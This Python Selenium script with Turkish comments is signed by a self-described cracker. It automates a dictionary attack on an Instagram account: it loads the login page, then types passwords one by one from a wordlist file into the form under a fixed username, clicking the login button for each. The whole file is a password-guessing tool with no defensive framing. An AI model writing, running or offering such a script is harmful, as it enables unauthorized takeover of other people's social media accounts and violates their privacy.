from selenium import webdriver
import time

browser = webdriver.Firefox()
browser.get("https://www.instagram.com/accounts/login") # Instagram giriş sayfasına yönlendir.

time.sleep(3) # Hata çıkmaması için buraya bir zamanlama koymamız gerek.

username = browser.find_element_by_name("username") # Username divinin name değeri girilecek knk.
password = browser.find_element_by_name("password") # Password divinin name değeri girilecek.
giris    = browser.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[4]') # Giriş yap butonunun xPath değeri alınacak.

dosya = open("passwords.txt", "r") # Şifrelerin kaydedildiği wordlist dosyamızı açtık.

for satir in dosya:
    username.send_keys("instagram kullanıcı adı") # Instagram kullanıcı adı knk.
    password.send_keys(satir) # WordList'teki şifreler. Tek tek denenecek.
    giris.click() # Giriş yap butonuna tıklama komutu knk.
    print("Denenen Şifre: [{}]".format(satir)) # Denenen şifreyi konsola yazdır.

    time.sleep(3) # Şifreler denendikten sonra 3 saniye bekle.

    username.clear() # Username değişkenini sıfırla.
    password.clear() # Password değişkenini sıfırla.

dosya.close() # WordList dosyamızı işlem bitince kapatalım.
time.sleep(10) # 10 Saniye bekleyelim.
browser.close() # WebDriveri sonlandıralım.
# By cracked SakirBey 2021
